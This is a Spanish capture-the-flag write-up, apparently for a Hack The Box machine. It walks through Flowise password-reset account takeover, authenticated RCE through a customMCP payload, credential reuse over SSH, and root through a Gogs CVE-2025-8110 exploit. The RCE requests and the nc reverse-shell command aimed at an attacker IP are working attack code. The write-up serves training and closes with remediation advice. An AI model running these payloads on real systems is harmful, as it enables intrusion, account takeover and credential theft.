---
layout: single
classes: wide
title: "Silentium - Writeup"
date: 2026-04-16
difficulty: Fácil
operating_system: Linux
service_hint: Flowise 3.0.5 + Gogs interno
tags:
  - Virtual Host
  - Flowise
  - Password Reset
  - RCE
  - Credenciales
  - Gogs
  - Privilege Escalation
summary: "Cadena de explotación: descubrimiento de un entorno Flowise en staging, toma de cuenta por reseteo inseguro, RCE autenticada en la aplicación, reutilización de credenciales para SSH y escalada final a root mediante Gogs interno vulnerable a CVE-2025-8110."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Fácil |
| Tags | `Virtual Host`, `Flowise`, `Password Reset`, `RCE`, `Reutilización de credenciales`, `Gogs`, `CVE-2025-8110`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

El primer objetivo fue confirmar la superficie mínima expuesta y verificar si la web dependía de nombres virtuales. La combinación `22/tcp` + `80/tcp` ya sugería un flujo clásico de enumeración web con posible acceso posterior por SSH.

Escaneamos puertos abiertos y descubrimos que solo 22/tcp y 80/tcp respondían.

```bash
nmap -p- --open -sS --min-rate 5000 -Pn 10.129.28.251
```

Con los puertos localizados, escaneamos banners y versiones, confirmando OpenSSH y la redirección a `silentium.htb`.

```bash
nmap -p22,80 -sCV 10.129.28.251
```

Indicadores relevantes de esta fase:

- `80/tcp` redirige a `http://silentium.htb/`, así que había que trabajar con virtual host.
- `22/tcp` expone OpenSSH sobre Ubuntu, una superficie candidata para reutilización posterior de credenciales.
- El sitio principal no mostraba funcionalidad sensible directa, así que el siguiente paso correcto era expandir superficie con fuzzing de subdominios.

## Enumeración web

Primero convenía medir si el sitio principal tenía rutas interesantes antes de saltar a hipótesis más complejas.

Fuzzeamos directorios en el virtual host principal, pero los resultados fueron mínimos.

```bash
gobuster dir -u http://silentium.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 --exclude-length 8753
```

El comportamiento de la web principal era deliberadamente austero, así que pasamos a fuzzear subdominios.

Fuzzeamos virtual hosts y descubrimos `staging.silentium.htb`.

```bash
wfuzz -H "Host: FUZZ.silentium.htb" --hc 404,403 --hh=178 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  http://silentium.htb
```

Subdominio relevante:

- `staging.silentium.htb`

Antes de inspeccionar la SPA, probamos fuzzing de directorios sobre staging, pero no encontramos nada fuera de lo esperado.

## Metodología de análisis del vector inicial

El vector de entrada se priorizó en el subdominio `staging.silentium.htb` porque los entornos de staging suelen tener configuraciones menos restrictivas que producción, incluyendo endpoints de depuración, registros de usuario abiertos o flujos de autenticación mal implementados.

La identificación de Flowise 3.0.5 como plataforma low-code orientó la investigación hacia endpoints de autenticación y recuperación de cuenta. En aplicaciones de este tipo, un flujo de reset mal implementado puede equivaler a takeover completo de la cuenta.

## Investigación de vulnerabilidades

Dos vectores principales guiaron la fase de investigación:

- **Password reset con fuga de información**: El endpoint `account/forgot-password` no solo diferenciaba usuarios válidos de inexistentes, sino que devolvía un `tempToken` reutilizable en la respuesta, permitiendo reseteo de contraseña sin verificación adicional.
- **RCE vía customMCP en Flowise**: La plataforma permite cargar nodos personalizados que evalúan configuración controlada por el usuario, un patrón clásico de ejecución de código dinámico sin las restricciones necesarias.
- **CVE-2025-8110 en Gogs**: Vulnerabilidad de symlink en repositorios que permite sobrescribir `.git/config` con un `sshCommand` malicioso, forzando ejecución de comandos del lado del servidor.

Una vez hallado el entorno `staging`, descargamos la portada para identificar la tecnología.

```bash
curl -s http://staging.silentium.htb | tee index.html
```

Del HTML extrajimos el bundle principal para revisar su contenido.

```bash
grep -i js index.html
```

El código cliente y el `view-source` dejaban una pista muy clara: el entorno corría **FlowiseAI**.

Descargamos el bundle JavaScript para buscar rutas API embebidas.

```bash
curl -s http://staging.silentium.htb/assets/index-C6GKaUTA.js -o main.js
```

Extraímos endpoints `/api/v1/` del bundle y descubrimos rutas como `version` y `account/forgot-password`.

```bash
grep -oE '/api/v1/[a-zA-Z0-9_/.-]*' main.js | sort -u
```

El endpoint más útil para perfilar la versión era `version`.

Consultamos la API de versiones y confirmamos Flowise 3.0.5.

```bash
curl -s http://staging.silentium.htb/api/v1/version
```

Salida relevante:

```json
{"version":"3.0.5"}
```

## Toma de cuenta en Flowise

Con Flowise identificado, el siguiente paso lógico fue revisar endpoints de autenticación y recuperación de acceso. En aplicaciones de este tipo, un flujo de reset mal implementado puede equivaler a takeover completo de la cuenta.

Fuzzeamos rutas adicionales bajo `/api/v1/` y descubrimos `account/forgot-password`.

```bash
gobuster dir -u http://staging.silentium.htb/api/v1/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 200 --exclude-length=31,3142
```

La ruta especialmente interesante fue `account/forgot-password`, porque permite diferenciar usuarios válidos frente a inexistentes.

Probamos el flujo de recuperación con un correo arbitrario y confirmamos que la API diferenciaba usuarios válidos de inexistentes.

```bash
curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"admin@silentium.htb"}}'
```

Una vez validado el patrón, se podía usar fuzzing para descubrir una cuenta real.

Fuzzeamos nombres de usuario contra el reseteo y descubrimos `ben@silentium.htb`.

```bash
wfuzz -z file,/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"FUZZ@silentium.htb"}}' \
  --hc 400 --hs "User Not Found" --hh 104 \
  http://staging.silentium.htb/api/v1/account/forgot-password
```

Usuario identificado:

- `ben@silentium.htb`

El hallazgo crítico aparece al repetir el flujo con la cuenta válida: la respuesta devuelve datos sensibles del usuario, incluyendo un `tempToken` reutilizable para resetear la contraseña.

Invocamos el reseteo sobre `ben` y descubrimos que la API devolvía un `tempToken` reutilizable.

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Salida relevante, con valores sensibles redactados:

```json
{
  "user": {
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "[REDACTED]",
    "tempToken": "[REDACTED]"
  }
}
```

Con ese `tempToken`, el takeover era directo.

Con el `tempToken`, cambiamos la contraseña de `ben` y tomamos control de la cuenta.

```bash
curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "[REDACTED]",
      "password": "[REDACTED]"
    }
  }'
```

En este punto ya había acceso legítimo a la interfaz de Flowise como `ben`. Las capturas originales del panel no estaban disponibles en el repositorio, así que ese paso se resume sin imágenes.

## RCE autenticada en Flowise

Con la cuenta comprometida, el siguiente objetivo fue convertir acceso a panel en ejecución remota. El vector útil estaba en la carga de nodos `customMCP`, donde la aplicación evaluaba configuración controlada por el usuario.

Las notas originales incluyen una referencia a una CVE en esta fase, pero no dejan evidencia suficiente para atribuir con rigor un identificador concreto solo a partir del material conservado. Por eso la omito y me centro en el comportamiento observado.

Probamos ejecución de código a través de `node-load-method/customMCP` y logramos ejecutar comandos en el contenedor.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl http://10.10.14.191\");return 1;})()})"
    }
  }'
```

Para confirmar la salida de red desde el objetivo, bastaba exponer un servidor HTTP simple en la máquina atacante.

Pusimos un servidor HTTP temporal para capturar el callback del contenedor y confirmar la ejecución.

```bash
python3 -m http.server 80
```

Con la ejecución verificada, el siguiente paso fue pedir una reverse shell.

Preparamos un listener para recibir la shell inversa desde el contenedor Flowise.

```bash
nc -nlvp 4444
```

Reemplazamos la prueba HTTP por una shell inversa dirigida a nuestro listener.

```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc 10.10.14.191 4444 -e sh\");return 1;})()})"
    }
  }'
```

La shell recibida no pertenecía todavía al host principal, sino al contenedor de la aplicación. El dato decisivo estaba en el entorno: credenciales operativas reutilizadas fuera de Flowise.

Inspeccionamos las variables de entorno en el contenedor y encontramos credenciales reutilizadas.

```bash
env
```

Valores relevantes, redactados deliberadamente:

```text
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=[REDACTED]
SMTP_PASSWORD=[REDACTED]
JWT_AUTH_TOKEN_SECRET=[REDACTED]
JWT_REFRESH_TOKEN_SECRET=[REDACTED]
```

## Acceso al host por SSH

La reutilización más útil fue `FLOWISE_PASSWORD`, porque la cuenta `ben` existía también en el sistema Linux. Antes de perder tiempo con más escape de contenedor, tenía más sentido validar directamente SSH.

Probamos `FLOWISE_PASSWORD` como SSH de `ben` y accedimos directamente al host.

```bash
ssh ben@silentium.htb
```

La sesión abre correctamente como `ben`, lo que confirma reutilización de credenciales entre la aplicación y el sistema operativo. La flag de usuario existía en `~/user.txt`, pero su valor se omite deliberadamente.

## Enumeración local

Ya dentro del host, lo correcto era revisar puertos locales y servicios no publicados externamente antes de insistir con SUIDs o vectores genéricos.

Listamos servicios en escucha en el host y descubrimos Gogs (`3001`) y MailHog (`8025`) en localhost.

```bash
ss -tulnp
```

Hallazgos útiles:

- `127.0.0.1:3001` expone un servicio web interno.
- `127.0.0.1:8025` sugiere una consola SMTP o MailHog.

Antes de priorizar Gogs, convenía validar rápidamente si `8025` aportaba credenciales o enlaces de reseteo.

Reenviamos `8025` por túnel SSH pero el buzón de MailHog estaba vacío — no aportó valor.

```bash
ssh -L 8025:127.0.0.1:8025 ben@silentium.htb
```

La consola confirmó que se trataba de MailHog, pero el buzón estaba vacío y no aportó ningún salto adicional.

![Consola MailHog sin mensajes útiles](/images/writeups/silentium/mailhog-empty.png)

La pista realmente prometedora era `3001`, porque los artefactos del sistema apuntaban a una instalación local de **Gogs**.

Buscamos directorios de Gogs y confirmamos su instalación local.

```bash
find / -path "*gogs*" -type d 2>/dev/null
```

Para interactuar con el servicio interno desde la máquina atacante sin tocar el firewall del objetivo, lo más limpio era usar tunelización SSH.

Reenviamos `3001` por túnel SSH y accedimos al Gogs interno desde nuestra máquina.

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

El túnel dejaba visible la portada de Gogs y confirmaba que la superficie interna era una forge Git completa, no un servicio auxiliar menor.

![Portada del Gogs interno expuesto por túnel SSH](/images/writeups/silentium/gogs-home.png)

El comportamiento de `Gogs`, sumado a la presencia de directorios de sesión y actividad reciente, justificaba probar un vector conocido de escritura vía symlink en repositorios.

## Escalada a root mediante Gogs

El material fuente incluye un exploit completo que abusa de `CVE-2025-8110`, una vulnerabilidad de Gogs basada en symlink + sobrescritura de `.git/config` para forzar ejecución de comandos del lado del servidor. En este caso sí hay evidencia suficiente para nombrarla porque la PoC está incluida y la explotación termina con shell como `root`.

La instancia además permitía registro de usuarios, lo que hacía posible crear una cuenta desechable y generar un token personal para interactuar con la API sin depender de credenciales privilegiadas previas dentro de Gogs.

![Formulario de registro disponible en el Gogs interno](/images/writeups/silentium/gogs-signup.png)

Una vez creada la cuenta, se generó un token de acceso personal. La captura se conserva porque contextualiza el flujo previo a la PoC, pero el valor del token fue redactado antes de publicarla.

![Generación de token en Gogs con el valor redactado](/images/writeups/silentium/gogs-token-redacted.png)

Antes de lanzar la PoC, hacía falta preparar un listener para la reverse shell resultante.

Preparamos un listener con `rlwrap` para recibir la shell del exploit.

```bash
rlwrap nc -lnvp 4444
```

Después, se ejecuta la PoC contra el Gogs interno usando un token API válido. El token se muestra redactado.

Lanzamos el exploit de `CVE-2025-8110`, que creó un symlink y ejecutó nuestra reverse shell como `root`.

```bash
python3 exploit.py \
  -u http://127.0.0.1:3001 \
  -lh 10.10.14.191 \
  -lp 4444 \
  --token [REDACTED]
```

La PoC crea un repositorio, sube un symlink a `.git/config`, sobrescribe `sshCommand` con una reverse shell y fuerza a Gogs a ejecutar esa configuración del lado servidor. El resultado es una shell como `root` dentro de la ruta temporal del repositorio local procesado por Gogs.

Con acceso a `root`, ya solo quedaba leer la flag final. Su valor se omite deliberadamente.

Leímos la flag de `root` para completar la máquina.

```bash
cat /root/root.txt
```

## Cadena de explotación

```text
Virtual host staging.silentium.htb
-> Flowise 3.0.5 expuesto
-> enumeración de usuarios vía forgot-password
-> fuga de tempToken y reset de contraseña de ben
-> acceso autenticado a Flowise
-> RCE vía customMCP
-> exposición de FLOWISE_PASSWORD en el contenedor
-> reutilización de credenciales por SSH como ben
-> descubrimiento de Gogs interno en 127.0.0.1:3001
-> explotación de CVE-2025-8110
-> shell como root
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones técnicas

1. Un flujo de recuperación de cuenta no puede devolver secretos reutilizables al cliente; eso convierte password reset en account takeover.
2. En plataformas tipo low-code o AI workflow, cualquier campo evaluado dinámicamente debe tratarse como superficie de RCE.
3. Las credenciales de aplicación no deben reutilizarse como contraseña del sistema.
4. Un servicio interno accesible solo por localhost sigue siendo explotable si un usuario comprometido puede tunelizarlo por SSH.

## Remediación

1. Corregir el flujo de recuperación de cuentas para que nunca devuelva `tempToken`, hashes ni metadatos sensibles del usuario.
2. Eliminar cualquier evaluación dinámica insegura en nodos `customMCP` o mecanismos equivalentes de Flowise.
3. Segregar credenciales entre aplicación, correo y sistema operativo.
4. Actualizar o aislar Gogs para eliminar la exposición a `CVE-2025-8110` y revisar permisos de uso de tokens API internos.

## Conclusión

HTB Silentium es una máquina de dificultad Fácil que combina la explotación de un flujo inseguro de recuperación de contraseña en Flowise 3.0.5 para tomar control de una cuenta, ejecución remota de código a través de nodos `customMCP`, reutilización de credenciales para acceso SSH, y escalada a root mediante CVE-2025-8110 en Gogs. La lección principal es que un staging mal configurado puede exponer la superficie completa de ataque, y que las credenciales de aplicación nunca deben reutilizarse como credenciales del sistema.
